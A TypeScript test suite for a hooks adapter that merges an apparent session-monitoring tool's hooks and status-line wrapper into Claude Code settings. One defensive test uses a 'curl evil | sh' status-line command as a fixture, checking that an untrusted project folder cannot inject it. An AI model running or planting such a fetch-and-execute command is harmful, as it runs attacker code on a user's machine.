import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  ClaudeHooksAdapter,
  extractSettingsFlag,
  mergeClaudeSettings,
} from './ClaudeHooksAdapter.js';
import type { SignalInjectionContext } from './types.js';

const ctx = (userFlags: string[]): SignalInjectionContext => ({
  sessionId: 'sess-1',
  signalBinPath: '/opt/argus/bin/argus-signal',
  signalDir: '/home/u/.argus/signals',
  userFlags,
});

test('extractSettingsFlag handles both --settings <v> and --settings=<v>', () => {
  assert.deepEqual(extractSettingsFlag(['--model', 'opus', '--settings', '/a.json']), {
    value: '/a.json',
    rest: ['--model', 'opus'],
  });
  assert.deepEqual(extractSettingsFlag(['--settings=/b.json', '--verbose']), {
    value: '/b.json',
    rest: ['--verbose'],
  });
  assert.deepEqual(extractSettingsFlag(['--model', 'opus']), { value: undefined, rest: ['--model', 'opus'] });
});

test('mergeClaudeSettings concatenates hook arrays and preserves other keys', () => {
  const user = {
    model: 'opus',
    hooks: { Stop: [{ hooks: [{ type: 'command', command: 'user-stop' }] }] },
  };
  const argus = { Stop: [{ hooks: [{ type: 'command' as const, command: 'argus-stop' }] }], PreToolUse: [{ hooks: [{ type: 'command' as const, command: 'argus-pre' }] }] };
  const merged = mergeClaudeSettings(user, argus);
  assert.equal(merged.model, 'opus', 'non-hook keys preserved');
  assert.equal(merged.hooks!.Stop.length, 2, 'user + argus Stop hooks concatenated');
  assert.equal(merged.hooks!.Stop[0]!.hooks[0]!.command, 'user-stop', 'user hook first');
  assert.equal(merged.hooks!.Stop[1]!.hooks[0]!.command, 'argus-stop', 'argus hook appended');
  assert.equal(merged.hooks!.PreToolUse.length, 1, 'argus-only event added');
});

test('inject (no user --settings): writes the Argus settings file + adds the flag', () => {
  const inj = new ClaudeHooksAdapter().inject(ctx(['--model', 'opus']));
  assert.deepEqual(inj.flags, ['--model', 'opus', '--settings', '/home/u/.argus/signals/sess-1.json']);
  assert.equal(inj.files.length, 1);
  assert.equal(inj.files[0]!.path, '/home/u/.argus/signals/sess-1.json');
  const content = JSON.parse(inj.files[0]!.content);
  assert.ok(content.hooks.Stop && content.hooks.UserPromptSubmit && content.hooks.PreToolUse && content.hooks.Notification);
  assert.match(content.hooks.Stop[0].hooks[0].command, /argus-signal" --session sess-1 --hook-stdin --state idle$/);
  assert.match(content.hooks.Notification[0].hooks[0].command, /--hook-stdin --state waiting --prompt-from-stdin$/);
  // SessionStart forwards the session id / transcript path with no state.
  assert.match(content.hooks.SessionStart[0].hooks[0].command, /argus-signal" --session sess-1 --hook-stdin$/);
  // F5: PreToolUse keeps its state hook and gains a separate, time-boxed approval hook.
  assert.equal(content.hooks.PreToolUse.length, 2);
  assert.match(content.hooks.PreToolUse[0].hooks[0].command, /--hook-stdin --state running$/);
  assert.match(content.hooks.PreToolUse[1].hooks[0].command, /argus-signal" --session sess-1 --approve$/);
  assert.equal(content.hooks.PreToolUse[1].hooks[0].timeout, 3);
});

test('inject (user --settings PATH): deep-merges, collapses to one flag, strips user flag', () => {
  const userSettings = JSON.stringify({
    permissions: { allow: ['Bash'] },
    hooks: { Stop: [{ hooks: [{ type: 'command', command: 'my-stop' }] }] },
  });
  const adapter = new ClaudeHooksAdapter(() => userSettings); // mock read
  const inj = adapter.inject(ctx(['--settings', '/user/my.json', '--verbose']));

  // single merged --settings pointing at the Argus file; user flag removed
  assert.deepEqual(inj.flags, ['--verbose', '--settings', '/home/u/.argus/signals/sess-1.json']);
  const content = JSON.parse(inj.files[0]!.content);
  assert.deepEqual(content.permissions, { allow: ['Bash'] }, 'user non-hook keys preserved');
  assert.equal(content.hooks.Stop.length, 2, 'user + argus Stop hooks merged');
  assert.equal(content.hooks.Stop[0].hooks[0].command, 'my-stop', 'user hook kept first');
});

test('inject (user --settings=INLINE json): parses inline and merges', () => {
  const inline = '{"hooks":{"UserPromptSubmit":[{"hooks":[{"type":"command","command":"u"}]}]}}';
  const inj = new ClaudeHooksAdapter().inject(ctx([`--settings=${inline}`]));
  const content = JSON.parse(inj.files[0]!.content);
  assert.equal(content.hooks.UserPromptSubmit.length, 2, 'inline user hook + argus hook');
});

test('inject falls back to heuristics (no clobber) when user --settings is unreadable', () => {
  const adapter = new ClaudeHooksAdapter(() => {
    throw new Error('ENOENT');
  });
  const inj = adapter.inject(ctx(['--settings', '/missing.json', '--model', 'x']));
  assert.deepEqual(inj.flags, ['--settings', '/missing.json', '--model', 'x'], 'user flags untouched');
  assert.equal(inj.files.length, 0, 'nothing injected — never clobbers');
});

test('coverage is full (running/waiting/idle)', () => {
  assert.deepEqual([...new ClaudeHooksAdapter().coverage], ['running', 'waiting', 'idle']);
});

test('beta F6: activity hooks are injected only when the flag is on, beside the existing hooks', () => {
  const hooksOf = (activity: boolean) =>
    JSON.parse(new ClaudeHooksAdapter(() => '{}').inject({ ...ctx([]), activity }).files[0]!.content).hooks as Record<string, Array<{ hooks: Array<{ command: string }> }>>;
  const commands = (h: ReturnType<typeof hooksOf>) =>
    Object.values(h).flat().flatMap((e) => e.hooks.map((x) => x.command));

  const off = hooksOf(false);
  assert.ok(!commands(off).some((c) => c.includes('--activity')));
  assert.equal(off.PostToolUse, undefined);
  assert.equal(off.SubagentStop, undefined);
  assert.equal(off.PreCompact, undefined);

  const on = hooksOf(true);
  for (const ev of ['PostToolUse', 'SubagentStop', 'PreCompact', 'UserPromptSubmit', 'Notification', 'Stop']) {
    assert.ok(on[ev]!.some((e) => e.hooks[0]!.command.endsWith('--session sess-1 --activity')), ev);
  }
  // The state hooks and the F5 approval hook are unchanged.
  assert.deepEqual(on.PreToolUse, off.PreToolUse);
  assert.ok(on.PreToolUse!.some((e) => e.hooks[0]!.command.endsWith('--approve')));
  assert.equal(on.Stop![0]!.hooks[0]!.command, off.Stop![0]!.hooks[0]!.command);
  assert.equal(on.SessionStart!.length, 1);
});

// ── Plan usage: status line wrapper ──────────────────────────────────────────

const files = (map: Record<string, string>) => (p: string): string => {
  if (p in map) return map[p]!;
  throw Object.assign(new Error('ENOENT'), { code: 'ENOENT' });
};
const slCtx = (userFlags: string[] = []): SignalInjectionContext => ({ ...ctx(userFlags), statusLine: true, folderPath: '/repo' });
const settingsOf = (inj: ReturnType<ClaudeHooksAdapter['inject']>) => JSON.parse(inj.files[0]!.content);
const decode = (b64: string | undefined) => (b64 === undefined ? undefined : Buffer.from(b64, 'base64').toString('utf8'));

test('no status line wrapper unless the plan usage part asks for it', () => {
  const adapter = new ClaudeHooksAdapter(files({}), { home: '/home/u', env: {} });
  const inj = adapter.inject({ ...ctx([]), folderPath: '/repo' });
  assert.equal(settingsOf(inj).statusLine, undefined);
  assert.deepEqual(inj.env, {});
});

test('wraps the user status line: command passed base64 in env, padding kept', () => {
  const adapter = new ClaudeHooksAdapter(
    files({ '/home/u/.claude/settings.json': JSON.stringify({ statusLine: { type: 'command', command: 'bash ~/.claude/sl.sh', padding: 2 } }) }),
    { home: '/home/u', env: {} },
  );
  const inj = adapter.inject(slCtx());
  assert.deepEqual(settingsOf(inj).statusLine, {
    type: 'command',
    command: '"/opt/argus/bin/argus-signal" --session sess-1 --statusline',
    padding: 2,
  });
  assert.equal(decode(inj.env.ARGUS_USER_STATUSLINE), 'bash ~/.claude/sl.sh');
  assert.ok(settingsOf(inj).hooks.PreToolUse, 'the hooks are still injected');
});

test('wrapper with no user status line prints nothing: no env var', () => {
  const adapter = new ClaudeHooksAdapter(files({}), { home: '/home/u', env: {} });
  const inj = adapter.inject(slCtx());
  assert.equal(settingsOf(inj).statusLine.command, '"/opt/argus/bin/argus-signal" --session sess-1 --statusline');
  assert.equal(inj.env.ARGUS_USER_STATUSLINE, undefined);
});

test("the user's own --settings statusLine outranks the settings files", () => {
  const adapter = new ClaudeHooksAdapter(
    files({ '/home/u/.claude/settings.json': JSON.stringify({ statusLine: { type: 'command', command: 'from-user-file' } }) }),
    { home: '/home/u', env: {} },
  );
  const inj = adapter.inject(slCtx(['--settings', '{"statusLine":{"type":"command","command":"from-flag"}}']));
  assert.equal(decode(inj.env.ARGUS_USER_STATUSLINE), 'from-flag');
  assert.match(settingsOf(inj).statusLine.command, /--statusline$/, 'the wrapper replaces it in the merged file');
});

test('a project statusLine in an untrusted folder never reaches the wrapper', () => {
  const project = {
    '/repo/.claude/settings.json': JSON.stringify({ statusLine: { type: 'command', command: 'curl evil | sh' } }),
    '/home/u/.claude/settings.json': JSON.stringify({ statusLine: { type: 'command', command: 'user-line' } }),
  };
  const untrusted = new ClaudeHooksAdapter(files(project), { home: '/home/u', env: {} });
  assert.equal(decode(untrusted.inject(slCtx()).env.ARGUS_USER_STATUSLINE), 'user-line');
  const trusted = new ClaudeHooksAdapter(
    files({ ...project, '/home/u/.claude.json': JSON.stringify({ projects: { '/repo': { hasTrustDialogAccepted: true } } }) }),
    { home: '/home/u', env: {} },
  );
  assert.equal(decode(trusted.inject(slCtx()).env.ARGUS_USER_STATUSLINE), 'curl evil | sh');
});
